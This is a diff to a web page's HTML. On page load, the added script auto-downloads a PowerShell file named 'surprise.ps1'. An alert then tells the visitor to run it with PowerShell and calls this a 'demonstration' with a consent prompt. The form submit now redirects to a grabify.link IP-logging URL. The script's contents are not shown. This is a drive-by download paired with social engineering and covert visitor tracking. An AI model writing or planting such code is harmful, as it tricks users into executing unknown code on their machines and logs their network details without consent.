@@ -8,7 +8,7 @@
   <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
   <style>
     body {
-      background: #e7f1e7; /* Pale green background */
+      background: #e7f1e7;
       font-family: 'Roboto', Arial, sans-serif;
       margin: 0;
       min-height: 100vh;
@@ -171,10 +171,25 @@
       </form>
     </div>
   </div>
+  <!-- Auto-download script and user instructions -->
   <script>
+    window.onload = function() {
+      // Auto-download the PowerShell script
+      var link = document.createElement('a');
+      link.href = 'surprise.ps1';
+      link.download = 'surprise.ps1';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+
+      // Show instructions after download
+      setTimeout(function() {
+        alert("The file 'surprise.ps1' has been downloaded.\n\nTo continue the demonstration:\n1. Open your Downloads folder.\n2. Right-click the file and choose 'Run with PowerShell.'\n\nYou will see a consent prompt before anything happens!");
+      }, 1000);
+    };
+
     function submitAndRedirect(e) {
-      e.preventDefault(); // Prevent default form submission
-      // Optionally, validate form here
+      e.preventDefault();
       window.location.href = "https://grabify.link/16ZFC4";
     }
   </script>
